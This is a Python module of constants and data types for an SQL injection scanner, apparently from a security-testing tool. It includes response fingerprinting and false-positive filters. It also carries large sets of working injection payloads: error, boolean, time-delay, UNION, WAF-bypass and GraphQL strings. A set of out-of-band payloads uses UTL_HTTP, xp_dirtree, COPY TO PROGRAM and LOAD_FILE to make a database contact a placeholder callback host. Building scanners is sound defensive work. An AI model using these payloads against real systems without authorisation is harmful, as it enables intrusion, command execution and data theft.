"""
SQL Injection Scanner - Base Types and Constants.

This module contains:
- Enums (ConfidenceLevel, DetectionMethod, WAFType, DatabaseType)
- Dataclasses (ResponseFingerprint, ResponseCluster, InjectionContext, SQLiEvidence, SQLiResult)
- Constants (payloads, patterns, limits)
- Helper functions (SPA detection)

Extracted from sqli_scanner.py as part of Phase 7 refactoring (2026-02-26).
"""

from __future__ import annotations

import hashlib
import re
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any

from utils.scanner_helpers import WAFType as BaseWAFType


# =============================================================================
# VERSION & PERFORMANCE CONSTANTS
# =============================================================================

SQLI_SCANNER_VERSION = "3.0.0-GOD-MODE"

# PERF-FIX 2026-02-20: Intelligent Payload Selection Constants
# Problem: Testing ALL payloads (100+ × 5 mutations = 500+ requests per endpoint)
# Solution: Early-exit + intelligent selection reduces to 30-50 targeted requests

# Maximum findings per endpoint before early-exit
# Multiple SQLi types CAN exist (error + time), but 3 findings proves the point
MAX_FINDINGS_PER_ENDPOINT = 3

# Maximum findings per parameter before moving to next
MAX_FINDINGS_PER_PARAM = 2

# Maximum total SQLi findings per scan (prevents report bloat)
MAX_TOTAL_FINDINGS = 50

# Maximum payloads to test when using intelligent selection
MAX_INTELLIGENT_PAYLOADS = 30

# Fallback: maximum hardcoded payloads when intelligent selection unavailable
MAX_FALLBACK_PAYLOADS = 15


# =============================================================================
# ENUMS
# =============================================================================

class ConfidenceLevel(Enum):
    """Confidence levels for findings."""
    DEFINITE = 100
    VERY_HIGH = 95
    HIGH = 90
    MEDIUM_HIGH = 85
    MEDIUM = 75
    LOW = 50
    UNCERTAIN = 25


class DetectionMethod(Enum):
    """SQL injection detection methods."""
    ERROR_BASED = auto()
    BOOLEAN_BLIND = auto()
    TIME_BLIND = auto()
    UNION_BASED = auto()
    STACKED_QUERIES = auto()
    OUT_OF_BAND = auto()
    SECOND_ORDER = auto()


class WAFType(Enum):
    """Known WAF signatures - wraps centralized version."""
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    AKAMAI = "akamai"
    IMPERVA = "imperva"
    MODSECURITY = "modsecurity"
    F5_BIG_IP = "f5_bigip"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    SUCURI = "sucuri"
    WORDFENCE = "wordfence"
    AZURE_WAF = "azure_waf"
    GOOGLE_CLOUD_ARMOR = "gcp_armor"
    UNKNOWN = "unknown"
    NONE = "none"

    @classmethod
    def from_base(cls, base_waf: BaseWAFType) -> "WAFType":
        """Convert from centralized WAFType."""
        mapping = {
            BaseWAFType.CLOUDFLARE: cls.CLOUDFLARE,
            BaseWAFType.AKAMAI: cls.AKAMAI,
            BaseWAFType.AWS_WAF: cls.AWS_WAF,
            BaseWAFType.IMPERVA: cls.IMPERVA,
            BaseWAFType.F5_BIG_IP: cls.F5_BIG_IP,
            BaseWAFType.MODSECURITY: cls.MODSECURITY,
            BaseWAFType.SUCURI: cls.SUCURI,
            BaseWAFType.FORTINET: cls.FORTINET,
            BaseWAFType.BARRACUDA: cls.BARRACUDA,
            BaseWAFType.AZURE_WAF: cls.AZURE_WAF,
            BaseWAFType.GOOGLE_CLOUD_ARMOR: cls.GOOGLE_CLOUD_ARMOR,
            BaseWAFType.WORDFENCE: cls.WORDFENCE,
            BaseWAFType.UNKNOWN: cls.UNKNOWN,
            BaseWAFType.NONE: cls.NONE,
        }
        return mapping.get(base_waf, cls.UNKNOWN)


class DatabaseType(Enum):
    """Database types."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    MARIADB = "mariadb"
    UNKNOWN = "unknown"


# =============================================================================
# DATACLASSES
# =============================================================================

@dataclass
class ResponseFingerprint:
    """Fingerprint of a response for comparison."""
    status_code: int
    content_length: int
    content_hash: str
    response_time: float
    error_present: bool = False
    error_type: str = ""
    word_count: int = 0
    line_count: int = 0
    tag_count: int = 0
    title: str = ""

    # Semantic features
    has_form: bool = False
    has_table: bool = False
    has_error_div: bool = False
    redirect_location: str = ""

    @classmethod
    def from_response(
        cls,
        response: Any,  # httpx.Response
        response_time: float,
        check_errors: bool = True,
    ) -> "ResponseFingerprint":
        """Create fingerprint from httpx response."""
        content = response.text
        content_hash = hashlib.md5(content.encode()).hexdigest()

        # Count features
        word_count = len(content.split())
        line_count = content.count('\n')
        tag_count = content.count('<')

        # Extract title
        title_match = re.search(r'<title[^>]*>([^<]*)</title>', content, re.IGNORECASE)
        title = title_match.group(1).strip() if title_match else ""

        # Semantic features
        has_form = '<form' in content.lower()
        has_table = '<table' in content.lower()
        has_error_div = 'class="error"' in content.lower() or 'class="alert"' in content.lower()

        # Check for redirect
        redirect = response.headers.get('location', '')

        # Error detection
        error_present = False
        error_type = ""
        if check_errors:
            error_present, error_type = cls._detect_error(content)

        return cls(
            status_code=response.status_code,
            content_length=len(content),
            content_hash=content_hash,
            response_time=response_time,
            error_present=error_present,
            error_type=error_type,
            word_count=word_count,
            line_count=line_count,
            tag_count=tag_count,
            title=title,
            has_form=has_form,
            has_table=has_table,
            has_error_div=has_error_div,
            redirect_location=redirect,
        )

    @staticmethod
    def _detect_error(content: str) -> tuple[bool, str]:
        """Detect SQL error in content."""
        # Import here to avoid circular dependency
        from scanning.modules.sqli.utils.database_fingerprinter import DatabaseFingerprinter

        db_type, confidence, pattern = DatabaseFingerprinter.detect(content)
        if confidence >= 70:
            return True, db_type.value
        return False, ""

    def similarity_score(self, other: "ResponseFingerprint") -> float:
        """Calculate similarity score between two fingerprints (0-100)."""
        score = 0.0
        weights = {
            'status': 25,
            'length': 20,
            'hash': 30,
            'words': 10,
            'structure': 15,
        }

        # Status code
        if self.status_code == other.status_code:
            score += weights['status']
        elif abs(self.status_code - other.status_code) < 100:
            score += weights['status'] * 0.5

        # Content length (within 10% considered similar)
        if self.content_length > 0 and other.content_length > 0:
            ratio = min(self.content_length, other.content_length) / max(self.content_length, other.content_length)
            if ratio > 0.9:
                score += weights['length']
            else:
                score += weights['length'] * ratio

        # Hash (exact match)
        if self.content_hash == other.content_hash:
            score += weights['hash']

        # Word count
        if self.word_count > 0 and other.word_count > 0:
            ratio = min(self.word_count, other.word_count) / max(self.word_count, other.word_count)
            score += weights['words'] * ratio

        # Structure (form, table, error)
        structure_matches = sum([
            self.has_form == other.has_form,
            self.has_table == other.has_table,
            self.has_error_div == other.has_error_div,
        ])
        score += weights['structure'] * (structure_matches / 3)

        return score


@dataclass
class ResponseCluster:
    """Cluster of baseline responses for comparison."""
    fingerprints: list[ResponseFingerprint] = field(default_factory=list)
    avg_length: float = 0.0
    avg_time: float = 0.0
    common_hash: str = ""

    def add(self, fp: ResponseFingerprint) -> None:
        """Add a fingerprint to the cluster."""
        self.fingerprints.append(fp)
        self._recalculate()

    def _recalculate(self) -> None:
        """Recalculate cluster statistics."""
        if not self.fingerprints:
            return

        lengths = [fp.content_length for fp in self.fingerprints]
        times = [fp.response_time for fp in self.fingerprints]

        self.avg_length = sum(lengths) / len(lengths)
        self.avg_time = sum(times) / len(times)

        # Find most common hash
        hash_counts: dict[str, int] = {}
        for fp in self.fingerprints:
            hash_counts[fp.content_hash] = hash_counts.get(fp.content_hash, 0) + 1

        if hash_counts:
            self.common_hash = max(hash_counts, key=hash_counts.get)  # type: ignore

    def is_anomalous(self, fp: ResponseFingerprint, threshold: float = 0.3) -> bool:
        """Check if fingerprint is anomalous compared to cluster."""
        if not self.fingerprints:
            return False

        # Length deviation
        if self.avg_length > 0:
            length_deviation = abs(fp.content_length - self.avg_length) / self.avg_length
            if length_deviation > threshold:
                return True

        # Time deviation (for time-based detection)
        if self.avg_time > 0:
            time_deviation = (fp.response_time - self.avg_time) / self.avg_time
            if time_deviation > 2.0:  # 2x slower
                return True

        # Hash mismatch (different content)
        if fp.content_hash != self.common_hash and len(self.fingerprints) >= 3:
            hash_match_rate = sum(1 for f in self.fingerprints if f.content_hash == self.common_hash) / len(self.fingerprints)
            if hash_match_rate > 0.8:  # >80% had same hash
                return True

        return False


@dataclass
class InjectionContext:
    """Context for an injection point."""
    url: str
    method: str  # GET, POST
    param_name: str
    param_value: str
    param_type: str  # query, body, header, cookie
    content_type: str = ""
    extra_params: dict[str, str] = field(default_factory=dict)
    headers: dict[str, str] = field(default_factory=dict)
    cookies: dict[str, str] = field(default_factory=dict)


@dataclass
class SQLiEvidence:
    """Evidence for SQL injection finding - forensic grade."""
    detection_method: DetectionMethod
    payload: str
    original_value: str
    response_status: int
    response_length: int
    response_time: float
    error_message: str = ""
    db_type: DatabaseType = DatabaseType.UNKNOWN
    db_version: str = ""
    baseline_status: int = 0
    baseline_length: int = 0
    baseline_time: float = 0.0
    differential_proof: str = ""
    cross_validation: list[str] = field(default_factory=list)
    waf_bypassed: bool = False
    waf_type: WAFType = WAFType.NONE
    mutations_tried: int = 0
    request_headers: dict[str, str] = field(default_factory=dict)
    request_body: str = ""
    response_headers: dict[str, str] = field(default_factory=dict)
    response_snippet: str = ""

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for reporting."""
        return {
            "detection_method": self.detection_method.name,
            "payload": self.payload,
            "original_value": self.original_value,
            "response_status": self.response_status,
            "response_length": self.response_length,
            "response_time": self.response_time,
            "error_message": self.error_message,
            "db_type": self.db_type.value,
            "db_version": self.db_version,
            "baseline_status": self.baseline_status,
            "baseline_length": self.baseline_length,
            "baseline_time": self.baseline_time,
            "differential_proof": self.differential_proof,
            "cross_validation": self.cross_validation,
            "waf_bypassed": self.waf_bypassed,
            "waf_type": self.waf_type.value,
            "mutations_tried": self.mutations_tried,
        }


@dataclass
class SQLiResult:
    """Result of SQLi detection attempt."""
    found: bool
    confidence: int  # 0-100
    evidence: SQLiEvidence | None = None


# =============================================================================
# WAF DETECTOR WRAPPER
# =============================================================================

class WAFDetector:
    """WAF detection wrapper - delegates to centralized scanner_helpers."""

    @classmethod
    def detect_from_response(cls, response: Any) -> WAFType:
        """Detect WAF from response headers."""
        from utils.scanner_helpers import WAFDetector as BaseDetector
        base_result = BaseDetector.detect_from_response(response)
        return WAFType.from_base(base_result)


# =============================================================================
# SPA DETECTION HELPER (FP FIX 2026-02-12)
# =============================================================================

# SPA indicators - comprehensive list for catch-all route detection
SPA_INDICATORS = [
    # Angular
    "ng-app", "data-ng-", "ng-controller", "[routerLink]", "ng-version",
    # React
    "data-reactroot", "data-react-helmet", "react-root", "__INITIAL_STATE__",
    # Vue
    "__vue__", "data-v-", "v-app",
    # Next.js / Nuxt
    "__next", "__NUXT__", "_nuxt",
    # Svelte / SvelteKit
    "data-svelte", "svelte-", "class=\"svelte-", "__svelte",
    # Qwik
    "data-qwik", "q:container", "qwik/optimizer", "__qwik",
    # SolidJS
    "data-solid", "_$HY", "__solid",
    # Astro
    "astro-island", "data-astro-cid-",
    # Remix
    "__remix_ssr__", "__remixContext", "__REMIX_CONTEXT__", "__remix",
    # Ember
    "ember-view",
    # Common SPA root IDs
    'id="root"', 'id="app"', 'id="__next"', 'id="__nuxt"',
]


def is_spa_response(content_type: str, body: str, body_length: int) -> bool:
    """Check if response looks like SPA catch-all (HTML with bundled JS).

    FP PREVENTION: SPAs return the same HTML shell for ANY path.
    Testing SQLi on these endpoints produces false positives because
    responses are identical regardless of input.
    """
    if "text/html" not in content_type.lower():
        return False

    # Check body length threshold (SPA shells are typically small)
    if body_length < 500 or body_length > 100000:
        return False

    # Count SPA indicators
    indicator_count = sum(1 for ind in SPA_INDICATORS if ind in body)

    # If 2+ indicators present, likely SPA
    return indicator_count >= 2


# =============================================================================
# PAYLOAD SETS
# =============================================================================

# Error-based payloads (ordered by reliability)
ERROR_PAYLOADS = [
    ("'", "single_quote", 50),
    ("\"", "double_quote", 40),
    ("'--", "quote_comment", 60),
    ("' OR '1'='1", "or_true", 70),
    ("' OR '1'='1'--", "or_true_comment", 75),
    ("' AND '1'='2", "and_false", 65),
    ("') OR ('1'='1", "or_paren", 70),
    ("1' ORDER BY 1--", "order_by_1", 60),
    ("1' ORDER BY 100--", "order_by_100", 65),
    ("' UNION SELECT NULL--", "union_1", 70),
    ("' UNION SELECT NULL,NULL--", "union_2", 70),
    ("' AND 1=CONVERT(int,'a')--", "mssql_convert", 80),
    ("' AND extractvalue(1,1)--", "mysql_extractvalue", 80),
    ("' || (SELECT '')||'", "pg_concat", 75),
    ("' AND 1=ctxsys.drithsx.sn(1,'a')--", "oracle_ctx", 80),
    # FIX 2026-02-12: LIKE/search context payloads
    ("'))--", "like_break", 65),  # Break out of LIKE '%...%'
    ("')) OR 1=1--", "like_or", 70),
    ("%'))--", "like_wildcard_break", 65),
]

# Boolean-based payloads (true/false pairs)
BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2", "string_and"),
    ("' OR '1'='1", "' OR '1'='2", "string_or"),
    ("1 AND 1=1", "1 AND 1=2", "numeric_and"),
    ("-1 OR 1=1", "-1 OR 1=2", "numeric_or"),
    ("') AND ('1'='1", "') AND ('1'='2", "paren_and"),
    ("' AND 1=1--", "' AND 1=2--", "comment_and"),
    ("' AND 'a'='a", "' AND 'a'='b", "char_and"),
    ("1) AND (1=1", "1) AND (1=2", "paren_numeric"),
    ("' AND SUBSTRING('a',1,1)='a'--", "' AND SUBSTRING('a',1,1)='b'--", "substring"),
    ("'/**/AND/**/'1'='1", "'/**/AND/**/'1'='2", "comment_bypass"),
    # FIX 2026-02-12: LIKE/search context payloads (breaks out of LIKE '%...%')
    ("'))--", "')) AND 1=2--", "like_breakout"),  # Juice Shop style
    ("')) OR 1=1--", "')) AND 1=2--", "like_or"),
    ("%')) OR 1=1--", "%')) AND 1=2--", "like_wildcard"),
    ("' OR 1=1)--", "' AND 1=2)--", "single_paren_or"),
    ("')) UNION SELECT NULL--", "')) AND 1=2--", "like_union"),
]

# Time-based payloads
# FIX 2026-02-19: Expanded payloads to reduce ~35% blind SQLi miss rate
TIME_PAYLOADS = [
    # MySQL - Primary
    ("' AND SLEEP({delay})--", "mysql", "sleep"),
    ("' OR SLEEP({delay})--", "mysql", "sleep_or"),
    ("' AND (SELECT SLEEP({delay}))--", "mysql", "subquery_sleep"),
    ("' AND IF(1=1,SLEEP({delay}),0)--", "mysql", "if_sleep"),
    ("' AND BENCHMARK(50000000,SHA1('test'))--", "mysql", "benchmark"),
    # MySQL additional contexts (miss rate reduction)
    ("1' AND SLEEP({delay})--", "mysql", "numeric_sleep"),
    ("1) AND SLEEP({delay})--", "mysql", "paren_sleep"),
    ("' AND SLEEP({delay})#", "mysql", "sleep_hash"),
    ("' AND (SELECT * FROM (SELECT SLEEP({delay}))a)--", "mysql", "nested_sleep"),
    ("'-SLEEP({delay})-'", "mysql", "arithmetic_sleep"),
    ("' AND SLEEP({delay}) AND '1'='1", "mysql", "balanced_sleep"),

    # MSSQL - Primary
    ("'; WAITFOR DELAY '0:0:{delay}'--", "mssql", "waitfor"),
    ("' WAITFOR DELAY '0:0:{delay}'--", "mssql", "waitfor_no_stack"),
    # MSSQL additional contexts
    ("1; WAITFOR DELAY '0:0:{delay}'--", "mssql", "numeric_waitfor"),
    ("'); WAITFOR DELAY '0:0:{delay}'--", "mssql", "paren_waitfor"),
    ("' IF 1=1 WAITFOR DELAY '0:0:{delay}'--", "mssql", "conditional_waitfor"),
    ("' AND 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:{delay}')--", "mssql", "subquery_waitfor"),

    # PostgreSQL - Primary
    ("'; SELECT pg_sleep({delay})--", "postgresql", "pg_sleep"),
    ("' AND pg_sleep({delay})--", "postgresql", "pg_sleep_and"),
    ("' || pg_sleep({delay})--", "postgresql", "pg_sleep_concat"),
    # PostgreSQL additional contexts
    ("1; SELECT pg_sleep({delay})--", "postgresql", "numeric_pg_sleep"),
    ("' AND (SELECT pg_sleep({delay}))--", "postgresql", "subquery_pg_sleep"),
    ("' AND pg_sleep({delay}) IS NOT NULL--", "postgresql", "isnull_pg_sleep"),
    ("$$ SELECT pg_sleep({delay}) $$", "postgresql", "dollar_pg_sleep"),

    # Oracle - Primary
    ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--", "oracle", "dbms_pipe"),
    ("' AND 1=DBMS_LOCK.SLEEP({delay})--", "oracle", "dbms_lock"),
    # Oracle additional contexts
    ("' AND 1=(SELECT COUNT(*) FROM ALL_USERS WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=1)--", "oracle", "subquery_pipe"),
    ("' || DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) || '", "oracle", "concat_pipe"),

    # SQLite - computationally expensive (no native SLEEP)
    ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "sqlite", "randomblob"),
    ("' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "sqlite", "randomblob_or"),
    ("')) AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "sqlite", "randomblob_paren"),
    # SQLite additional heavy operations
    ("' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS t1, (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS t2, (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS t3, (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS t4)>0--", "sqlite", "cartesian_product"),

    # JSON context payloads (modern APIs often use JSON)
    ('{"id":"1\' AND SLEEP({delay})--"}', "mysql", "json_sleep"),
    ('{"id":"1\'; WAITFOR DELAY \'0:0:{delay}\'--"}', "mssql", "json_waitfor"),
    ('{"id":"1\'; SELECT pg_sleep({delay})--"}', "postgresql", "json_pg_sleep"),
]

# FIX 2026-02-19: Mandatory OOB fallback payloads for blind SQLi
OOB_MANDATORY_PAYLOADS = [
    # Oracle OOB (most reliable)
    ("' || UTL_HTTP.REQUEST('http://{callback}/{token}') || '", "oracle", "utl_http"),
    ("' || UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}') || '", "oracle", "utl_inaddr"),
    ("' || (SELECT UTL_HTTP.REQUEST('http://{callback}/{token}') FROM DUAL) || '", "oracle", "utl_http_dual"),
    # MSSQL OOB
    ("'; EXEC master..xp_dirtree '//{token}.{domain}/a'--", "mssql", "xp_dirtree"),
    ("'; EXEC master..xp_fileexist '//{token}.{domain}/a'--", "mssql", "xp_fileexist"),
    ("'; DECLARE @q varchar(1024); SET @q='\\\\{token}.{domain}\\a'; EXEC master..xp_dirtree @q--", "mssql", "xp_dirtree_var"),
    # PostgreSQL OOB
    ("'; COPY (SELECT '') TO PROGRAM 'nslookup {token}.{domain}'--", "postgresql", "copy_nslookup"),
    ("'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host={token}.{domain}')--", "postgresql", "dblink"),
    # MySQL OOB (limited, requires FILE privilege)
    ("' UNION SELECT LOAD_FILE(CONCAT('//{token}.{domain}/',VERSION()))--", "mysql", "load_file"),
    ("' INTO OUTFILE '//{token}.{domain}/a'--", "mysql", "into_outfile"),
]

# UNION payloads
UNION_TEMPLATES = [
    "' UNION SELECT {columns}--",
    "' UNION ALL SELECT {columns}--",
    "') UNION SELECT {columns}--",
    "-1' UNION SELECT {columns}--",
    "' UNION/**/SELECT {columns}--",
    "' /*!UNION*/ /*!SELECT*/ {columns}--",
    "' UNION SELECT {columns}#",
    "0' UNION SELECT {columns}--",
]

# WAF bypass payloads
WAF_BYPASS_PAYLOADS = [
    ("'/**/OR/**/'1'='1", "inline_comment"),
    ("' OR%0a'1'='1", "newline"),
    ("' OR\t'1'='1", "tab"),
    ("'+OR+'1'='1", "plus"),
    ("' oR '1'='1", "case_mix"),
    ("'/*!50000OR*/'1'='1", "version_comment"),
    ("' OR 0x31=0x31--", "hex"),
    ("' OR CHAR(49)=CHAR(49)--", "char"),
    ("%27%20OR%20%271%27%3D%271", "url_encode"),
    ("%2527%2520OR%2520%25271%2527%253D%25271", "double_encode"),
    ("' O/**/R '1'='1", "split_keyword"),
    ("' UN/**/ION SEL/**/ECT NULL--", "split_union"),
]

# Header injection targets
INJECTABLE_HEADERS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
    "X-Real-IP", "X-Client-IP", "True-Client-IP", "Client-IP",
    "X-Originating-IP", "X-Remote-IP", "CF-Connecting-IP", "Accept-Language",
]

# GraphQL injection payloads
GRAPHQL_PAYLOADS = [
    '{"query":"{ user(id: \\"1\' OR \'1\'=\'1\\") { id } }"}',
    '{"query":"{ search(term: \\"test\' UNION SELECT NULL--\\") { id } }"}',
    '{"query":"mutation { login(user: \\"admin\'--\\", pass: \\"x\\") { token } }"}',
]

# FALSE POSITIVE INDICATORS
# FIX 2026-02-16: Removed "Invalid input" - it blocks DVWA, bWAPP, Mutillidae
FP_INDICATORS = [
    r"404 Not Found",
    r"403 Forbidden",
    r"401 Unauthorized",
    r"Page not found",
    r"Access denied",
    r"Please enter a valid",
    # r"Invalid input",  # REMOVED - blocks legitimate SQL errors on PHP apps
    r"required field",
    r"validation error",
    r"captcha",
    r"rate limit",
    r"too many requests",
    r"please try again",
    r"session expired",
    r"csrf",
    r"token.*invalid",
]

FP_CONTENT_PATTERNS = [
    r"error.*handling.*policy",
    r"error.*message.*display",
    r"sql.*tutorial",
    r"syntax.*highlighting",
    r"example.*query",
    r"sample.*code",
]


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    # Version
    "SQLI_SCANNER_VERSION",
    # Constants
    "MAX_FINDINGS_PER_ENDPOINT",
    "MAX_FINDINGS_PER_PARAM",
    "MAX_TOTAL_FINDINGS",
    "MAX_INTELLIGENT_PAYLOADS",
    "MAX_FALLBACK_PAYLOADS",
    # Enums
    "ConfidenceLevel",
    "DetectionMethod",
    "WAFType",
    "DatabaseType",
    # Dataclasses
    "ResponseFingerprint",
    "ResponseCluster",
    "InjectionContext",
    "SQLiEvidence",
    "SQLiResult",
    # Classes
    "WAFDetector",
    # Functions
    "is_spa_response",
    # Payload sets
    "ERROR_PAYLOADS",
    "BOOLEAN_PAYLOADS",
    "TIME_PAYLOADS",
    "OOB_MANDATORY_PAYLOADS",
    "UNION_TEMPLATES",
    "WAF_BYPASS_PAYLOADS",
    "INJECTABLE_HEADERS",
    "GRAPHQL_PAYLOADS",
    # FP patterns
    "FP_INDICATORS",
    "FP_CONTENT_PATTERNS",
    "SPA_INDICATORS",
]
